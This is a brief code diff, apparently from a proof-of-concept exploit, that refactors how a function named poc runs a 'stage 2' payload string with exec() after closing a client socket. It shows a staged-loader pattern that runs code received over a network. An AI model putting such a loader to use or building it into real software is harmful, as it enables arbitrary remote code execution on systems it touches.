@@ -1387,10 +1387,9 @@ def poc():
         sc.syscalls.close(client_sock)  # close client socket
 
         # Execute stage 2, mimic file-exec by throwing local/global in same scope
-        global_scope = dict(globals())
-        local_scope = dict(locals())
+        global_scope = dict(globals(), **locals())
         try:
-            exec(stage2_str, global_scope, local_scope)
+            exec(stage2_str, global_scope)
             print("Stage 2 payload executed successfully")
         except Exception as e:
             exc_msg = traceback.format_exc()
